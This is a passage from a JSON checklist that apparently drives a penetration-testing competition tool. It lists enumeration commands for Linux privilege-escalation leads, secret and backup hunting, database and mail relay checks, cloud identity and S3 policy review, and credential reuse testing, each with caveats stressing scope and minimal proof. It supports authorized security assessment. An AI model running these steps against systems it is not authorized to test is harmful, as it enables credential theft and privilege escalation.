            "guidance": "An NFS export is a shared Linux directory. Note its path and allowed clients, then check the relevant files and numeric user/group ownership through an authorized mount. With host access, inspect /etc/exports for broad client ranges and no_root_squash. NFSv4-only servers may not appear in this listing."
          },
          {
            "title": "Can TFTP return a file without a login?",
            "requires": "Confirmed UDP response or service configuration",
            "check": "For TFTP, identify a known file from configuration or documentation before requesting it. For NTP, IKE and other UDP services, verify the protocol response and version first.",
            "command": "curl -q --max-time 10 --output kiss-tftp-sample.bin {TFTP_URL}\nwc -c kiss-tftp-sample.bin",
            "evidence": "Exact request, returned bytes, source/destination and timeout behavior.",
            "caveat": "Do not infer a vulnerability from open|filtered or guess a huge file list. TFTP has no directory-listing operation.",
            "validation": "The returned file contains information that should not be anonymously readable. A timeout or empty output is inconclusive.",
            "runOn": "Testing workstation · Bash",
            "setup": "Set TFTP URL to tftp://HOST/known-file from configuration or documentation. This overwrites kiss-tftp-sample.bin locally; curl must include TFTP support.",
            "guidance": "Request a known configuration or provisioning filename from the Linux TFTP service. Inspect the downloaded file for secrets or internal paths, then review the TFTP root and file permissions if you have host access. This replaces kiss-tftp-sample.bin locally; curl needs TFTP support.",
            "searchTerms": [
              "TFTP and other UDP leads"
            ]
          }
        ]
      },
      {
        "title": "Identity & application context",
        "items": [
          {
            "title": "Identity, network, and host context",
            "check": "Identify user/groups, OS, kernel, interfaces, routes, local listeners, and container clues. Record how this shell was obtained.",
            "evidence": "Identity and environment baseline, plus newly discovered internal endpoints.",
            "caveat": "A kernel version string alone is not proof of vulnerability; distributions backport fixes.",
            "command": "id\ncat /etc/os-release\nuname -a\nip route\nss -lntup",
            "validation": "Discovery only: establish the current account and host. Root/SYSTEM claims need actual identity evidence, not an OS guess.",
            "runOn": "Target Linux host · shell",
            "guidance": "Run these after obtaining a Linux shell. Note your user and groups, operating-system version, routes and listening ports. Use the results to choose sudo, service-permission or internal-service checks and record how the shell was obtained."
          },
          {
            "title": "Web configs and application credentials",
            "check": "Review discovered web applications for exposed .env files, repository metadata, backups, and administrative interfaces. Check justified credential reuse on relevant services.",
            "evidence": "Source file/endpoint, secret provenance, and separate validation result.",
            "caveat": "Validate file content rather than status alone. Coordinate authentication attempts.",
            "command": "curl -q -i --max-time 15 {TEST_URL}",
            "validation": "The endpoint discloses an actual application secret/configuration to the tested identity. Credential validity and service privileges require a separate login check.",
            "runOn": "Testing workstation · Bash",
            "setup": "Use the exact discovered configuration/backup URL. Do not treat the presence of the text PASSWORD in an error page as a leaked credential.",
            "guidance": "Enter the exact URL of a discovered configuration file or backup. Look for actual settings and secrets rather than words appearing in an error page. If you recover a credential, record its source and test it on the intended database or service."
          },
          {
            "title": "Application running as root",
            "check": "Inspect the effective user of the exposed application process and its systemd unit.",
            "evidence": "Process owner, executable, service definition, and reason root is unnecessary.",
            "caveat": "Some master processes legitimately start as root and drop worker privileges. Check the request-handling process, not only the parent.",
            "command": "ps -eo user,pid,ppid,args",
            "validation": "The exposed application process actually runs as root. Demonstrating an application exploit inherits root requires separate execution evidence.",
            "runOn": "Target Linux host · shell",
            "guidance": "Find the application in the process list and check the USER column. If it is root, inspect its writable scripts, configuration and exposed functionality. Link any application weakness to the privileges that process would give an attacker."
          },
          {
            "title": "Is the installed web server missing a security fix?",
            "check": "Check the installed package build against vendor advisories when a version suggests a local escalation.",
            "evidence": "Package version, vendor patch status, enabled modules, and exploit prerequisites.",
            "caveat": "The historical report relied on a version banner and includes outdated remediation. Do not copy its minimum-version claim; vendor backports matter.",
            "command": "apache2 -v\nhttpd -v",
            "validation": "The distribution package build matches an affected vendor advisory without a backported fix. The upstream banner alone is not sufficient.",
            "runOn": "Target Linux host · shell",
            "guidance": "Check the installed Apache version; often only one of these two commands exists. Compare the full distribution package version with the vendor’s advisory. Linux vendors may include security fixes without changing the main version number, so an old-looking banner is not conclusive.",
            "searchTerms": [
              "Web-server package and patch verification"
            ]
          }
        ]
      },
      {
        "title": "Privilege escalation",
        "items": [
          {
            "title": "Which commands can you run with sudo?",
            "check": "Read allowed sudo commands, argument restrictions, environment handling, and accessible doas configuration. Inspect the exact binary and dependencies.",
            "evidence": "Rule, current account, binary ownership/permissions, and applicable behavior.",
            "caveat": "Use GTFOBins as a lead; verify the rule and local binary support the behavior. Repeat after each user change.",
            "command": "sudo -l",
            "validation": "The actual allowed command, arguments and writable dependencies permit an unintended privileged action. sudo -l output alone does not prove a usable escape.",
            "runOn": "Target Linux host · shell",
            "guidance": "sudo -l lists commands your user can run as another account, often root. Read the exact executable and allowed arguments. Check for scripts you can edit, writable dependencies or features that launch other commands, then verify the specific path.",
            "searchTerms": [
              "Sudo and doas rules"
            ]
          },
          {
            "title": "SUID/SGID and file capabilities",
            "check": "Find unusual privileged binaries and capabilities; inspect ownership, writable dependencies, and executable behavior.",
            "evidence": "Binary path, mode/capabilities, version, and required conditions.",
            "caveat": "Standard SUID utilities are not inherently findings. -xdev limits the search to one filesystem; inspect relevant mounts separately.",
            "command": "find / -xdev -type f -perm /6000 2>/dev/null\ngetcap -r /usr /opt 2>/dev/null",
            "validation": "An unusual executable/capability has a concrete behavior that crosses the privilege boundary. Normal SUID binaries are not findings simply because they exist.",
            "runOn": "Target Linux host · shell",
            "guidance": "These settings give programs extra privileges. Start with unusual custom programs, writable executables and capabilities such as reading protected files or changing identity. Inspect the exact program’s behavior and demonstrate the privileged action available to your user."
          },
          {
            "title": "Writable privileged jobs and services",
            "check": "Review cron, systemd timers/services, and process activity. Trace privileged jobs to scripts, binaries, parent directories, PATH entries, and configuration.",
            "evidence": "Scheduler/service definition, execution user, relevant writable path, and evidence it is actually used.",
            "caveat": "A writable file matters when a more privileged process consumes it. Avoid replacing live files just to demonstrate permissions.",
            "command": "crontab -l\ncat /etc/crontab\nsystemctl list-timers --all\nps aux",
            "validation": "A privileged job executes a path or dependency writable by the current low-privilege user. Scheduling output alone is insufficient.",
            "runOn": "Target Linux host · shell",
            "guidance": "Find scheduled commands running as root or another powerful account. Follow the command to its script, executable and parent folders. Look for something your user can modify, then record the permissions and how the privileged job uses it."
          },
          {
            "title": "Systemd service user and writable paths",
            "check": "Inspect the specific service that runs privileged code and the ownership of its executable/configuration path.",
            "evidence": "Unit text, User/Group, ExecStart, file permissions, and traversal permissions.",
            "caveat": "An omitted User normally means a system unit runs as root, but verify the running process and any privilege dropping.",
            "command": "systemctl cat {SERVICE}\nnamei -l {FILE}",
            "validation": "The resolved executed file or dependency is writable by the low-privilege identity and used by the privileged service. Verify the actual execution chain.",
            "runOn": "Target Linux host · shell",
            "guidance": "Enter a service unit such as app.service and the path of the program it runs. Check the service’s User and ExecStart settings, then the file and folder permissions. A useful lead is a privileged service running code your current user can modify."
          },
          {
            "title": "Match installed packages to a specific vulnerability",
            "check": "After configuration checks, compare the exact OS/package build and enabled features against a specific advisory.",
            "evidence": "Affected build, configuration prerequisites, patch evidence, and validation status.",
            "caveat": "Kernel and service exploits may crash the host. A scanner suggestion is a candidate until validated.",
            "command": "uname -a\ncat /etc/os-release\nif command -v dpkg-query >/dev/null; then dpkg-query -W; elif command -v rpm >/dev/null; then rpm -qa; fi",
            "validation": "The installed package/build and enabled feature match the affected conditions in a specific vendor advisory. Version inventory alone is not a demonstrated privilege escalation.",
            "runOn": "Target Linux host · shell",
            "setup": "Run on the target and retain the exact distribution package release; backported fixes may preserve the upstream version.",
            "guidance": "Collect the system version and installed packages from the target. Match a specific package and feature to the vendor’s vulnerability advisory, including any distribution fixes. Choose a test only after those conditions match. An old version alone is not proof of a working privilege escalation.",
            "searchTerms": [
              "Targeted version-based escalation"
            ]
          }
        ]
      },
      {
        "title": "Secrets, containers & internal access",
        "items": [
          {
            "title": "Secrets and backups near your foothold",
            "check": "Start with the entry application’s config and logs. Check accessible history, environment, SSH material, deployment files, and relevant backups.",
            "evidence": "Path, file permissions, account context, and minimal secret evidence.",
            "caveat": "Do not indiscriminately collect everything. Report examples should redact secrets; preserve useful originals as controlled evidence.",
            "command": "test -r {FILE} && sed -n '1,100p' -- {FILE}",
            "validation": "The current low-privilege identity can read a secret it should not possess. Record provenance and verify its intended service separately.",
            "runOn": "Target Linux host · shell",
            "setup": "Set File path to a known application config or relevant backup. Limit the captured excerpt to the evidence needed.",
            "guidance": "Set File path to a known application configuration or relevant backup on the host. The command prints its first 100 lines if your user can read it. Look for real credentials, record their source, then verify their intended service. Keep only the excerpt needed for evidence."
          },
          {
            "title": "Mounts, containers, and sockets",
            "check": "Inspect mounts, fstab, container context, Docker/LXD membership, sockets, and host-mounted paths for dangerous privilege boundaries.",
            "evidence": "Socket/file access, group membership, daemon context, and mounted resources.",
            "caveat": "Group membership or container presence alone does not prove host root. Rootless daemons and namespace restrictions change impact.",
            "command": "findmnt\nls -l /var/run/docker.sock\ncat /etc/fstab",
            "validation": "The current identity can access a privileged management socket or unintended host mount. Socket existence alone does not prove access or escape.",
            "runOn": "Target Linux host · shell",
            "guidance": "Check which filesystems are attached and whether the Docker control socket is present. Access to that socket or sensitive host folders can be powerful. Inspect your actual read/write permissions next; seeing a path does not prove you can use it or escape a container."
          },
          {
            "title": "Internal-only service access",
            "check": "Compare external scan results with listeners and routes visible on the foothold.",
            "evidence": "Bound address/port, service identity, network vantage point, and authentication required.",
            "caveat": "Local binding is often a protection. Report a bypass only when an attacker can actually reach or abuse it.",
            "command": "ss -lntup\nip route",
            "validation": "A service reachable from the foothold violates an expected network boundary. Local listeners alone are normal and do not prove a segmentation failure.",
            "runOn": "Target Linux host · shell",
            "guidance": "Compare the local listening ports with your workstation scan. Investigate interesting services bound to 127.0.0.1 from the shell you obtained. Record any new data or capability reachable through this access and the host you used to reach it."
          }
        ]
      },
      {
        "title": "Databases & application storage",
        "items": [
          {
            "title": "Does the PostgreSQL account have excessive rights?",
            "check": "Check whether the identified database requires authentication and what privileges the available login has.",
            "evidence": "Connection identity, database, and role attributes.",
            "caveat": "A rejected login is not a vulnerability. Do not enable command execution or change server settings merely to inventory roles.",
            "command": "psql -h {HOST} -U {USER} -d {DATABASE} -W -c 'SELECT rolname, rolsuper, rolcreaterole, rolcreatedb FROM pg_roles WHERE rolname = current_user;'",
            "validation": "The effective account has unjustified elevated role flags. This does not establish that arbitrary OS commands were executed.",
            "runOn": "Testing workstation · Bash",
            "guidance": "Use the application’s PostgreSQL credential and inspect rolsuper, rolcreaterole and rolcreatedb. Check whether it can reach databases outside the application’s needs. With a Linux shell, inspect the relevant pg_hba.conf authentication rules and the service’s operating-system user.",
            "searchTerms": [
              "PostgreSQL role and authentication exposure"
            ]
          },
          {
            "title": "Which permissions does the MySQL account have?",
            "requires": "Testing workstation; supplied database account",
            "check": "Connect with a password prompt. Inspect the authenticated identity and grants before reading application tables.",
            "command": "mysql --host={HOST} --user={USER} --password --execute='SELECT USER(), CURRENT_USER(), VERSION(); SHOW GRANTS;'",
            "evidence": "Connection identity, effective database account, server version and grants.",
            "caveat": "USER() and CURRENT_USER() can differ. A banner alone is not proof of weak authentication; avoid changing global settings to demonstrate impact.",
            "references": [
              {
                "label": "Nmap: mysql-info",
                "url": "https://nmap.org/nsedoc/scripts/mysql-info.html"
              }
            ],
            "validation": "The effective account’s grants exceed its intended role. A valid connection alone does not establish overprivilege.",
            "runOn": "Testing workstation · Bash",
            "guidance": "Read SHOW GRANTS for the application’s MySQL or MariaDB account. Look for broad database access or powerful FILE privileges. With a Linux shell, inspect relevant my.cnf files and the database service user to understand which files or applications could be affected.",
            "searchTerms": [
              "MySQL / MariaDB identity and grants"
            ]
          },
          {
            "title": "MongoDB anonymous database visibility",
            "requires": "Testing workstation; MongoDB reachable",
            "check": "Connect without credentials and request database names only. Distinguish a successful connection from permission to list or read data.",
            "command": "mongosh --host {HOST} --port 27017 --quiet --eval 'db.adminCommand({listDatabases: 1, nameOnly: true})'",
            "evidence": "Authentication context, returned database names or authorization error.",
            "caveat": "A connection handshake alone is not unauthorized data access. Do not bulk dump collections to establish a limited exposure.",
            "references": [
              {
                "label": "MongoDB: shell options",
                "url": "https://www.mongodb.com/docs/mongodb-shell/reference/options/"
              }
            ],
            "validation": "Database names are returned without credentials when that metadata should be restricted. Handshake success alone does not establish record reads.",
            "runOn": "Testing workstation · Bash",
            "guidance": "Try listing MongoDB databases without credentials. Inspect a small relevant record if access is allowed. With Linux host access, review the MongoDB configuration, bind address and service user, then identify which applications depend on the exposed data."
          },
          {
            "title": "Redis unauthenticated command access",
            "requires": "Testing workstation; Redis reachable",
            "check": "Try a read-only identity query without credentials. If allowed, inspect only the minimum server metadata needed to characterize exposure.",
            "command": "redis-cli -h {HOST} -p 6379 ACL WHOAMI",
            "evidence": "Result or NOAUTH response, target and whether any credentials were supplied.",
            "caveat": "ACL WHOAMI exists from Redis 6. An unsupported command is not proof of authentication. Success proves this command was permitted, not access to every key.",
            "references": [
              {
                "label": "Redis: ACL WHOAMI",
                "url": "https://redis.io/docs/latest/commands/acl-whoami/"
              }
            ],
            "validation": "ACL WHOAMI returns an identity without credentials. This demonstrates permission to run that command, not unrestricted access to every key or command.",
            "runOn": "Testing workstation · Bash",
            "guidance": "Try this Redis command without credentials. A returned username gives you a starting point for checking allowed reads; NOAUTH means login is required. With Linux host access, review Redis ACLs, bind settings and the service user. Older versions may not support ACL WHOAMI."
          }
        ]
      },
      {
        "title": "Mail, monitoring & management",
        "items": [
          {
            "title": "SMTP capabilities and transport",
            "requires": "Testing workstation; SMTP service reachable",
            "check": "Inspect advertised commands and STARTTLS support before testing any mail-delivery behavior.",
            "command": "nmap -Pn -n -p 25,465,587 --script smtp-commands {HOST}",
            "evidence": "Port, EHLO capabilities, TLS availability and advertised authentication mechanisms.",
            "caveat": "Normal inbound SMTP accepts unauthenticated connections. This does not establish open relay or mailbox access.",
            "references": [
              {
                "label": "Nmap: smtp-commands",
                "url": "https://nmap.org/nsedoc/scripts/smtp-commands.html"
              }
            ],
            "validation": "The response establishes capabilities. Unauthenticated EHLO and inbound mail reception are normal and do not prove open relay.",
            "runOn": "Testing workstation · Bash",
            "guidance": "For Postfix, Exim or another Linux mail server, identify the inbound and submission ports and their TLS/login options. Compare them with the expected mail flow. Use a controlled delivery test to investigate relay, then inspect the relevant service configuration if you have a shell."
          },
          {
            "title": "Prove mail relay with controlled addresses",
            "requires": "Two approved test mailboxes and an agreed delivery test",
            "check": "Differentiate external-to-local delivery from external-to-external relay. If permitted, send one uniquely marked message between controlled mailboxes and verify receipt.",
            "command": "swaks --server {HOST} --from {MAIL_FROM} --to {MAIL_TO} --header \"Subject: KISS controlled relay test\" --body \"Controlled competition delivery test.\"",
            "evidence": "MAIL FROM, RCPT TO, acceptance responses, message ID and receipt at the destination.",
            "caveat": "RCPT acceptance may still be followed by rejection. Do not label normal mail reception an anonymous-login vulnerability.",
            "validation": "The unauthenticated external-to-external message is delivered to your controlled recipient. RCPT acceptance alone is not proof of delivery.",
            "runOn": "Testing workstation · Bash",
            "setup": "Use two controlled mailboxes outside the server’s local domains. This sends one actual message; save the received headers and SMTP transcript.",
            "guidance": "Use two controlled external mailboxes to test whether the Linux mail server forwards mail without a login. This sends one message. Preserve delivery headers and the SMTP transcript; with host access, review relay restrictions and trusted-network settings."
          },
          {
            "title": "SNMPv3 discovery metadata",
            "requires": "Testing workstation with raw-packet privileges; UDP 161",
            "check": "Request the SNMPv3 discovery information to identify the engine and target implementation.",
            "command": "sudo nmap -sU -Pn -n -p 161 --script snmp-info {HOST}",
            "evidence": "Returned engine information, version and response evidence.",
            "caveat": "Engine discovery is not access to the management data. For v1/v2c, assess a supplied or explicitly tested community separately.",
            "references": [
              {
                "label": "Nmap: snmp-info",
                "url": "https://nmap.org/nsedoc/scripts/snmp-info.html"
              }
            ],
            "validation": "Discovery only: engine metadata is returned. This does not demonstrate read access to management objects.",
            "runOn": "Testing workstation · Bash",
            "guidance": "Ask the Linux SNMP agent for its identifying information. Use the response to identify the agent and choose a focused follow-up. With host access, review which SNMP versions and user permissions the monitoring configuration enables."
          },
          {
            "title": "SNMP community access",
            "requires": "Testing workstation; an approved community value",
            "check": "Use a small system-tree query, not a full walk of every table. Record which attributes are actually disclosed.",
            "command": "snmpwalk -v2c -c {COMMUNITY} -t 2 -r 1 {HOST} 1.3.6.1.2.1.1",
            "evidence": "Community context, version, sysName/sysDescr and other returned attributes.",
            "caveat": "Timeouts may mean filtering, bad community or no service. Read access does not establish write access; do not issue SET requests as an enumeration step.",
            "validation": "The tested community returns actual system attributes outside the intended access boundary. Read access does not prove SNMP write permission.",
            "runOn": "Testing workstation · Bash",
            "guidance": "Query the Linux SNMP agent with the supplied community string. Look for system details exposed to unintended clients. If you have a shell, inspect snmpd configuration for allowed networks, exposed data and read/write permissions."
          },
          {
            "title": "Exposed databases and management services",
            "check": "Inspect identified Redis, MongoDB, SQL, dashboards, container APIs, and monitoring interfaces for unauthenticated access or applicable default credentials.",
            "evidence": "Minimal returned metadata/data and the identity needed to retrieve it.",
            "caveat": "A reachable port does not prove no firewall or weak authentication. Avoid data-changing probes and bulk dumps.",
            "command": "curl -q -i --max-time 15 {TEST_URL}",
            "validation": "The endpoint returns sensitive management data or performs an administrative action without the expected authentication. A product banner alone is not sufficient.",
            "runOn": "Testing workstation · Bash",
            "setup": "Set Test URL to the discovered read-only management/API endpoint. Use the dedicated Redis/MongoDB/SQL checks for non-HTTP services.",
            "guidance": "Inspect discovered Linux-hosted dashboards, container-management APIs and monitoring interfaces. Look for access to private settings or actions while logged out. With a shell, trace the affected service to its account, configuration files and listening address."
          }
        ]
      }
    ]
  },
  {
    "id": "cloud",
    "title": "Cloud",
    "intro": "Start with the active identity and the exact account, project or tenant in scope.",
    "groups": [
      {
        "title": "Identity & scope",
        "items": [
          {
            "title": "Identify the active AWS principal",
            "requires": "Testing workstation; explicitly configured competition AWS profile",
            "check": "Check the identity of the current profile before inspecting resources. Compare the account ID with the supplied scope.",
            "command": "aws sts get-caller-identity --no-cli-pager",
            "evidence": "Account ID, principal ARN and the profile used.",
            "caveat": "This operation confirms identity, not broad permissions. A working key may still have very limited access.",
            "references": [
              {
                "label": "AWS: GetCallerIdentity",
                "url": "https://docs.aws.amazon.com/cli/latest/reference/sts/get-caller-identity.html"
              }
            ],
            "validation": "Discovery only: this identifies the caller. GetCallerIdentity success does not establish broad AWS permissions.",
            "runOn": "Testing workstation · Bash",
            "guidance": "Identify the AWS account and user or role used by your credentials. Confirm the account is in scope, then query a relevant resource. Save this identity alongside later evidence so it is clear which credential enabled the access."
          },
          {
            "title": "Identify the active Azure tenant and subscription",
            "requires": "Testing workstation; competition Azure session",
            "check": "Inspect the selected subscription and tenant. Confirm they belong to the engagement before any resource query.",
            "command": "az account show --output json",
            "evidence": "Tenant, subscription, principal and current session context.",
            "caveat": "A signed-in identity is not necessarily a subscription owner. Tenant-wide and resource-scoped permissions differ.",
            "references": [
              {
                "label": "Azure CLI: account",
                "url": "https://learn.microsoft.com/en-us/cli/azure/account?view=azure-cli-latest"
              }
            ],
            "validation": "Discovery only: this establishes the selected cloud context, not owner privileges.",
            "runOn": "Testing workstation · Bash",
            "guidance": "Check which Azure organization and subscription the CLI is using. Confirm they match the engagement, then inspect access to a specific resource. Record the selected identity and subscription with your results."
          },
          {
            "title": "Identify the active Google Cloud account and project",
            "requires": "Testing workstation; competition gcloud configuration",
            "check": "Check which cached identity is active and which project the CLI will target.",
            "command": "gcloud auth list\ngcloud config get-value project",
            "evidence": "Active account, project and configuration used.",
            "caveat": "Cached credentials may be expired. A configured project is not proof of permission to access it.",
            "references": [
              {
                "label": "Google Cloud: auth list",
                "url": "https://docs.cloud.google.com/sdk/gcloud/reference/auth/list"
              }
            ],
            "validation": "Discovery only: cached identity/project configuration does not prove live access or permissions.",
            "runOn": "Testing workstation · Bash",
            "guidance": "Check the selected Google account and project. Confirm access with a small request to an agreed resource, then use that result to choose the next permission check. Save the active identity and project with your evidence."
          }
        ]
      },
      {
        "title": "Storage, secrets & permissions",
        "items": [
          {
            "title": "Public object storage access",
            "requires": "A known, scoped bucket/container/object URL",
            "check": "Compare access without a signed URL or token against access with the provided identity. Test a known object and listing separately.",
            "command": "curl -q -i --max-time 15 {TEST_URL}",
            "evidence": "Exact resource URL, authentication state, response and minimal content demonstrating exposure.",
            "caveat": "Public listing and object readability are different permissions. A public website asset may be intentionally readable; record the sensitive data or policy boundary.",
            "references": [
              {
                "label": "AWS: S3 access control",
                "url": "https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-overview.html"
              }
            ],
            "validation": "An unsigned, unauthenticated request returns a sensitive object that should be private. Public website assets and denied listings are not proof of exposure.",
            "runOn": "Testing workstation · Bash",
            "setup": "Set Test URL to a known object URL without signed query parameters or authorization headers.",
            "guidance": "Enter the direct URL of a known storage object, without a temporary access token in the URL. The command sends no login details. If private contents are returned, preserve a small sample and the exact URL. Public website images are often intentionally accessible."
          },
          {
            "title": "Cloud credentials in application configuration",
            "requires": "Access to an application config, log or build artifact",
            "check": "Record where the credential appeared, identify its provider and test its identity only within the supplied account. Track temporary credentials and expiration.",
            "command": "aws sts get-caller-identity --no-cli-pager",
            "evidence": "Source path, credential type, principal and minimal demonstrated permissions.",
            "caveat": "An access-key-shaped string is not necessarily live. Temporary AWS credentials require a session token; never infer administrator access from a key alone.",
            "references": [
              {
                "label": "AWS: GetCallerIdentity",
                "url": "https://docs.aws.amazon.com/cli/latest/reference/sts/get-caller-identity.html"
              }
            ],
            "validation": "A credential recovered from an unintended source resolves to a real scoped AWS principal. Identity alone does not demonstrate broader permissions.",
            "runOn": "Testing workstation · Bash",
            "setup": "Configure the recovered AWS credentials in an isolated competition profile first; include its session token if temporary. Use the Azure/GCP identity entries for those providers.",
            "guidance": "For an AWS key found in application files, configure a separate competition CLI profile and select it before running this command. Temporary keys also need their session token. A returned identity confirms which account the key belongs to; check specific resource permissions next."
          },
          {
            "title": "Who can access this S3 bucket?",
            "requires": "Known principal and permission to inspect scoped configuration",
            "check": "Compare granted actions, resources and conditions with the application role. Trace a concrete read or administrative path using the smallest proof.",
            "command": "aws s3api get-bucket-policy --bucket {BUCKET} --no-cli-pager",
            "evidence": "Principal, policy/role binding, affected resource, conditions and observed capability.",
            "caveat": "A wildcard alone does not capture all effective permissions: denies, boundaries and resource policies can change the result. Separate potential access from performed actions.",
            "references": [
              {
                "label": "AWS: policy evaluation",
                "url": "https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_evaluation-logic.html"
              }
            ],
            "validation": "The returned policy grants a principal unintended actions on a scoped resource, considering applicable denies and boundaries. Reading the policy itself is not proof of broad access.",
            "runOn": "Testing workstation · Bash",
            "setup": "This is an AWS S3 policy-review example, not a provider-wide permission test. Select one scoped bucket and verify any suspected operation separately.",
            "guidance": "Enter one in-scope S3 bucket name. Its policy describes who may access which objects and actions. Look for access that exceeds the intended role, then verify that specific operation. Other restrictions may override the policy, so a broad allow rule alone is not final proof.",
            "searchTerms": [
              "Excessive cloud permissions"
            ]
          }
        ]
      }
    ]
  },
  {
    "id": "findings",
    "title": "Reporting",
    "intro": "Turn observations into reproducible findings and a short account of business impact.",
    "groups": [
      {
        "title": "Authentication & identity",
        "items": [
          {
            "title": "Weak password or authentication policy",
            "check": "Assess effective length, common/compromised-password controls, rate limiting, MFA for sensitive access, and relevant account protections.",
            "evidence": "Effective policy, affected accounts/services, test method, and realistic attack exposure.",
            "caveat": "Do not automatically demand rotation or composition rules. No lockout is not inherently a flaw if effective alternative controls exist.",
            "command": "ldapsearch -x -ZZ -H {LDAP_URI} -D {BIND_ID} -W -b {BASE_DN} -s base minPwdLength lockoutThreshold lockoutDuration pwdProperties",
            "validation": "The effective account policy violates a documented requirement or permits a demonstrated weak-authentication path. Domain defaults alone do not account for fine-grained policy.",
            "runOn": "Testing workstation · Bash",
            "guidance": "Read the domain’s password and lockout rules, then compare them with the agreed requirements. Check for separate policies affecting the user you are testing. A policy concern is stronger when you can explain which account is affected and what unwanted access it enables."
          },
          {
            "title": "Username enumeration",
            "check": "Demonstrate a repeatable distinction between existing and nonexistent accounts in login, registration, recovery, or directory access.",
            "evidence": "Controlled comparison and how discovering accounts helps an attacker in this environment.",
            "caveat": "Public usernames and intentional directory visibility may reduce impact. Severity is contextual.",
            "command": "KISS_CHECK_DIR=$(mktemp -d)\ncurl -q --config {BASELINE_CONFIG} --max-time 15 -D \"$KISS_CHECK_DIR/baseline.headers\" -o \"$KISS_CHECK_DIR/baseline.body\"\ncurl -q --config {TEST_CONFIG} --max-time 15 -D \"$KISS_CHECK_DIR/test.headers\" -o \"$KISS_CHECK_DIR/test.body\"\ndiff -u \"$KISS_CHECK_DIR/baseline.body\" \"$KISS_CHECK_DIR/test.body\"\nprintf 'Evidence: %s\\n' \"$KISS_CHECK_DIR\"",
            "validation": "A stable semantic difference discloses account existence. Ignore dynamic tokens and incidental response-length changes.",
            "runOn": "Testing workstation · Bash",
            "setup": "Prepare two curl config files, not raw HTTP requests or shell scripts. Each uses one option per line, for example url = \"https://app/path\", request = \"POST\", header = \"Cookie: session=...\", data = \"field=value\". Preserve the real method, body, content type, authentication and CSRF fields. Set their local paths below. A diff only locates changes; inspect the response and resulting application state. Use one known controlled account and one nonexistent account in otherwise identical login/recovery requests, then repeat.",
            "guidance": "Compare a known test username with a made-up one in otherwise identical requests. Look for a stable difference such as “unknown user” versus “wrong password.” Repeat to confirm it, then save both responses. Random tokens and small page-size changes are not enough."
          },
          {
            "title": "Is this encoded value actually a password?",
            "check": "Determine whether recovered values are actual reusable plaintext/reversible passwords or just encoded binary/hash values.",
            "evidence": "Storage location, access rights, decoded value type, and demonstrated credential use if tested.",
            "caveat": "Do not treat every LDIF base64 value as a password flaw or repeat the old report’s salted-SHA1 remediation. Choose a suitable modern password-storage design.",
            "command": "base64 --decode {FILE}",
            "validation": "Decoded output is an actual credential rather than binary/hash material. Base64 decoding is not password cracking; a validity claim requires testing the decoded credential on its intended service.",
            "runOn": "Testing workstation · Bash",
            "setup": "Set File path to a local file containing only the encoded value, not an entire LDIF record.",
            "guidance": "Set File path to a local file containing only the base64 value, not the whole LDAP record. Decoding may reveal text, binary data or a password hash. If it reveals a possible password, test it on the intended service; decoding alone does not prove the credential is valid.",
            "searchTerms": [
              "Reversible passwords versus encoded output"
            ]
          },
          {
            "title": "Credential reuse and shared administration",
            "check": "Document a recovered credential working on more than one relevant system or role.",
            "evidence": "Proven access pairs, account scope, and the blast radius created by reuse.",
            "caveat": "Duplicate usernames are not proof of password reuse. Keep local and domain identities distinct.",
            "command": "read -rsp 'Password: ' KISS_CHECK_PASSWORD; echo\nnxc smb {HOST} -d {SMB_DOMAIN} -u {USER} -p \"$KISS_CHECK_PASSWORD\" --shares\nunset KISS_CHECK_PASSWORD",
            "validation": "A credential already verified on one host also grants access to this second scoped host under the same intended identity. Record both results and whether reuse is contrary to policy.",
            "runOn": "Testing workstation · Bash",
            "setup": "Run against one second host, not a subnet. Verify local/domain authority and rule out guest mapping.",
            "guidance": "Take a credential already confirmed on one host and try it on one other in-scope host. Check that it logs in as the intended local or domain account, not guest. If reuse grants unintended access, save both results and explain how one exposed password affects multiple systems."
          },
          {
            "title": "Account lifecycle and shadow IT",
            "check": "Review stale employee access, unowned services, and unmanaged applications against client records.",
            "evidence": "Owner, business justification, lifecycle status, and access or sensitive data still present.",
            "caveat": "An unfamiliar application is not automatically unauthorized. Confirm with the client.",
            "command": "ldapsearch -x -ZZ -H {LDAP_URI} -D {BIND_ID} -W -b {BASE_DN} '(&(objectCategory=person)(objectClass=user))' sAMAccountName userAccountControl accountExpires lastLogonTimestamp",
            "validation": "An enabled account belongs to a confirmed departed user or violates the authoritative lifecycle policy. Old lastLogonTimestamp alone does not establish an orphan account.",
            "runOn": "Testing workstation · Bash",
            "guidance": "Compare the listed accounts with authoritative records of current employees and services. Follow up on an enabled account belonging to someone who has left. An old login timestamp is only a clue; record why the account should no longer exist and what access it retains."
          }
        ]
      },
      {
        "title": "Exposure & configuration",
        "items": [
          {
            "title": "Weak cryptographic choices",
            "check": "Identify weak/deprecated negotiated protocols or algorithms, inappropriate password storage, or exposed key material.",
            "evidence": "Exact protocol/algorithm, negotiation/configuration evidence, protected asset, and relevant threat.",
            "caveat": "An algorithm name alone is insufficient. TLS 1.2 is not automatically weak; hashing for checksums differs from password storage.",
            "command": "nmap -Pn -n -sV -p 443 --script ssl-enum-ciphers {HOST}",
            "validation": "The endpoint accepts a deprecated protocol or weak cipher inconsistent with its security requirement. Tie the result to sensitive traffic and the actual negotiated configuration.",
            "runOn": "Testing workstation · Bash",
            "setup": "Change port 443 to the discovered TLS service port if needed. The script makes multiple TLS connections.",
            "guidance": "This checks the encryption protocols and ciphers accepted on port 443; change the port for another TLS service. Look for obsolete options and compare them with the service’s requirements. Explain what sensitive traffic is affected rather than reporting a cipher name without context."
          },
          {
            "title": "Excessive permissions and exposed data",
            "check": "Assess anonymous access, broad groups, writable shares, service privileges, and read access to secrets or sensitive records.",
            "evidence": "Identity, resource, demonstrated permission, and expected business boundary.",
            "caveat": "Public content and intended access are not findings merely because they are accessible.",
            "command": "nxc smb {HOST} -u '' -p '' --share {SHARE} --dir",
            "validation": "Anonymous access reveals directory content outside the intended public boundary. A sensitive-file exposure claim still requires a minimal read of that file.",
            "runOn": "Testing workstation · Bash",
            "setup": "Select the relevant share; guest and anonymous sessions may map differently.",
            "guidance": "Try listing the selected share with an empty login, then read a relevant employee or administrator file. Record the identity, path and exposed contents. Explain which users should have access and how the current permissions exceed that."
          },
          {
            "title": "Is SMB message signing required?",
            "check": "Review obsolete software, signing/protection settings, unnecessary services, segmentation, and logging against the actual threat model and requirements.",
            "evidence": "Observed configuration/version, affected assets, and a defensible consequence or unmet requirement.",
            "caveat": "Missing banners/headers are not automatically high risk. A lack of visible logs does not prove the server logs nothing.",
